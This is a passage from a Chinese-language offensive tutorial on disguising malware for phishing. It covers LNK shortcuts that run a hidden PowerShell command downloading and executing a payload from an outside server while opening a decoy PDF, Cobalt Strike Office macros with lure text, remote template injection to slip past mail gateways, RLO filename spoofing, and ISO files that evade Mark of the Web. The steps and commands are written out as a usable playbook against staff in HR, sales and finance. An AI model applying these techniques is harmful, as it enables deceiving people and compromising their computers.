### 选择恰当的载荷：让恶意代码看起来"正常" {#选择恰当的载荷让恶意代码看起来正常}

还记得"人员测绘"章节吗？我们已经知道了：

- 给谁发（销售/HR/财务/特定角色人员）
- 发什么内容（采购需求/简历/洽谈会议/财务补贴）

**但现在的问题是：如何让木马文件看起来"正常"？**<br> 随着各类野生勒索软件的数量增长，能毫无心理负担打开exe的人已经越来越少了。

---

### 🪝 方法一：LNK 快捷方式（最常用） {#方法一lnk-快捷方式最常用}

**原理：** Windows 快捷方式可以执行任意命令

#### 基础操作 {#基础操作}

```text
1. 创建一个快捷方式
2. 目标位置写：
   C:\Windows\System32\cmd.exe /c powershell -w hidden -c "IEX(...); start 真实简历.pdf"
3. 图标改成 PDF 的图标
4. 文件名改成：简历.pdf.lnk
```

**效果：**

- 用户看到：`简历.pdf`（看起来是个 PDF）
- 用户双击：木马静默运行 + 打开真实的 PDF
- 用户感受：就是打开了一份简历，没什么异常

---

#### 进阶：自适配图标 {#进阶自适配图标}

**问题：** 如果你硬编码一个 PDF 图标路径，目标机器上可能不存在

**解决：** 修改 LNK 的 `icon_location` 为文件后缀

```text
不要写：C:\Program Files\Adobe\Acrobat\acrobat.exe
而是写：.pdf

系统会自动联想到对应的打开方式，显示正确的图标
```

---

#### 完整攻击流程 {#完整攻击流程}

```powershell
# 1. 生成 Beacon
Attacks -> Packages -> Windows Executable (Stageless)

# 2. 创建 LNK
目标：powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/a'); Start-Process '真实简历.pdf'"

# 3. 准备真实的 PDF
在你的 Web 服务器上放一份真实的简历 PDF

# 4. 发送钓鱼邮件
附件：张三的简历.pdf.lnk（改图标为 PDF）
```

**用户体验：**

```text
1. 收到邮件："这是我的简历"
2. 双击附件
3. PDF 打开了，看起来就是份简历
4. （背后：Beacon 已经上线）
```

### 🪝 方法二：Office 宏（针对办公场景） {#方法二office-宏针对办公场景}

**原理：** Word/Excel 可以嵌入 VBA 宏代码

#### 基础操作 {#基础操作-1}

```text
1. Cobaltstrike 生成宏：
   Attacks -> Packages -> MS Office Macro

2. 创建 Word 文档，插入宏
   视图 -> 宏 -> 创建 -> 粘贴 CS 生成的代码

3. 保存为 .docm 格式
```

---

#### 进阶：话术诱导 + 远程模板 {#进阶话术诱导-远程模板}

**技巧一：制作逼真的"启用宏"提示**

```text
在文档中放一张虚化的简历背景
上面写：
"本文档受保护，需要启用宏才能正常查看
请点击上方'启用内容'按钮"
```

**技巧二：远程模板加载（绕过杀软）**

```text
1. 制作一个干净的 Word 文档（不含宏）
2. 修改 word/_rels/settings.xml.rels：
   <Relationship Target="http://你的服务器/模板.dotm" />

3. 用户打开文档时，自动加载远程模板
4. 远程模板里才包含宏代码
```

**优势：**

- 本地文件干净，绕过邮件网关扫描
- 可以随时更新远程模板的宏代码

### 🪝 方法三：RLO 文件名反转 {#方法三rlo-文件名反转}

**原理：** Unicode 字符 `U+202E` 可以让后续文字从右向左显示

#### 操作步骤 {#操作步骤}

```text
1. 原始文件名：payload.exe

2. 插入 RLO 字符：
   pay[RLO]gpj.exe

3. 显示效果：
   payexe.jpg（看起来是图片）

4. 实际类型：
   .exe 可执行文件
```

**演示：**

```text
文件资源管理器显示：简历照片.jpg
文件属性显示：.exe 文件

用户双击 → 运行了木马
```

### 🪝 方法四：ISO 镜像文件 {#方法四iso-镜像文件}

**原理：** Windows 10/11 对 ISO 文件有原生支持，双击自动挂载

#### 什么是 MotW？ {#什么是-motw}

```text
Mark of the Web（网络标记）
从互联网下载的文件会被标记
打开时会有安全警告："此文件来自互联网"
```

**ISO 的特殊性：**

```text
ISO 文件本身会被标记
但 ISO 内部的文件不会被标记！
```

#### 攻击流程 {#攻击流程}

```text
1. 创建一个 ISO 文件
2. 里面放入：
   - payload.exe（木马）
   - 快捷方式.lnk（指向 payload.exe）
   - 一些伪装文件（让 ISO 看起来合理）

3. 用户双击 ISO：
   → 自动挂载为虚拟光驱（如 E:）
   → 用户看到里面的文件
   → 双击"快捷方式.lnk"
   → 没有安全警告！
   → 木马运行
```

---

## 总结：不要让对方觉得自己打开了可执行程序 {#总结不要让对方觉得自己打开了可执行程序}

除非你的话术是要求对方配合安装一些特定的软件，否则我们总是尽可能让对方认为"我没有运行程序，只是查看了文档/访问了网页"，尤其是在双方并没有建立起良好的信任关系之时。
